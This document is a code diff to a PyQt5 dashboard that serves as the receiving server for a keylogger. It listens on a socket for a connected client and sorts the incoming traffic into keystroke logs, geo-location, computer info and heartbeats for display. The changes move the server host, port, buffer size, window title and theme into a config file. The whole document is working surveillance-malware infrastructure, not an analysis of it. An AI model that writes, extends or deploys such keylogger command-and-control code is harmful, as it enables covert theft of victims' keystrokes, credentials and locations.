@@ -5,6 +5,7 @@ from gui.controllers.Dashboard import Ui_MainWindow
 from gui.controllers.SetComputerInfo import Ui_SetComputerInfo
 from gui.controllers.SetEmailInfo import Ui_SetEmaiInfo
 from PyQt5.QtCore import pyqtSignal, QThread
+from config import config
 
 
 class Worker(QThread):
@@ -22,9 +23,15 @@ class Worker(QThread):
     def run(self):
         bindsocket = socket.socket()
         bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        bindsocket.bind(('0.0.0.0', 10000))
-        bindsocket.listen(1)  # Only accept 1 client
-        print("[*] Server listening on port 10000")
+
+        # Get server config
+        host = config.get('server', 'host')
+        port = config.get('server', 'port')
+        backlog = config.get('server', 'listen_backlog')
+
+        bindsocket.bind((host, port))
+        bindsocket.listen(backlog)
+        print(f"[*] Server listening on {host}:{port}")
 
         while True:
             try:
@@ -44,16 +51,18 @@ class Worker(QThread):
                 print(f"[!] Error accepting client connection: {e}")
 
     def handle_client(self):
+        buffer_size = config.get('keylogger', 'buffer_size')
+
         try:
             while True:
                 try:
-                    data = self.client_socket.recv(4096).decode()
+                    data = self.client_socket.recv(buffer_size).decode()
                 except Exception as e:
                     print(f"[!] Error decoding data: {e}")
                     break
 
                 if data:
-                    print(f"[+] Data received: {data.strip()}")
+                    print(f"[+] Data received: {data[:50]}...")  # Truncate for cleaner logs
                     self.handle_received_data(data.strip())
                 else:
                     break
@@ -73,11 +82,10 @@ class Worker(QThread):
             print(f"[Worker] Emitting geo-location")
             self.geo_location_signal.emit(data)
         elif "HEARTBEAT" in data:
-            # Ignore heartbeat messages
-            print(f"[Worker] Heartbeat received")
+            # Ignore heartbeat messages (just for keeping connection alive)
+            pass
         else:
             # Treat everything else as keylog data
-            print(f"[Worker] Emitting keylog")
             self.keylog_signal.emit(data)
 
 
@@ -87,6 +95,17 @@ class MainWindow(QMainWindow):
         self.ui = Ui_MainWindow()
         self.ui.setupUi(self)
         self.client_connected = False
+
+        # Set window title from config
+        window_title = config.get('gui', 'window_title')
+        self.setWindowTitle(window_title)
+
+        # Apply theme from config
+        theme = config.get('gui', 'theme')
+        if theme == 'dark':
+            self.set_dark_mode()
+        else:
+            self.set_light_mode()
 
         # Connect UI buttons
         self.ui.SetComputerInfo.clicked.connect(self.open_set_computer_info_window)
@@ -111,7 +130,7 @@ class MainWindow(QMainWindow):
         self.child_window2.show()
 
     def refresh_logs(self):
-        print("Refreshing logs...")
+        print("[*] Refreshing logs...")
         # Clear all text fields
         self.ui.plainTextEdit.clear()
         self.ui.plainTextEdit_2.clear()
@@ -119,11 +138,15 @@ class MainWindow(QMainWindow):
 
     def set_light_mode(self):
         self.setStyleSheet("background-color: white; color: black;")
-        print("Switched to light mode.")
+        config.set('gui', 'theme', value='light')
+        config.save()
+        print("[*] Switched to light mode.")
 
     def set_dark_mode(self):
         self.setStyleSheet("background-color: #2E2E2E; color: white;")
-        print("Switched to dark mode.")
+        config.set('gui', 'theme', value='dark')
+        config.save()
+        print("[*] Switched to dark mode.")
 
     def start_server_listener(self):
         self.worker = Worker()
@@ -139,16 +162,17 @@ class MainWindow(QMainWindow):
         """Handle new client connection"""
         print(f"[MainWindow] Client connected: {client_id}")
         self.client_connected = True
-        self.setWindowTitle(f"Dashboard - Client: {client_id}")
+        window_title = config.get('gui', 'window_title')
+        self.setWindowTitle(f"{window_title} - Client: {client_id}")
 
     def handle_client_disconnected(self):
         """Handle client disconnection"""
         print(f"[MainWindow] Client disconnected")
         self.client_connected = False
-        self.setWindowTitle("Dashboard - No Client Connected")
+        window_title = config.get('gui', 'window_title')
+        self.setWindowTitle(f"{window_title} - No Client Connected")
 
     def update_keylog(self, log_line):
-        print(f"[MainWindow] Updating keylog: {log_line}")
         self.ui.plainTextEdit_3.appendPlainText(log_line)
 
     def update_computer_info(self, info):
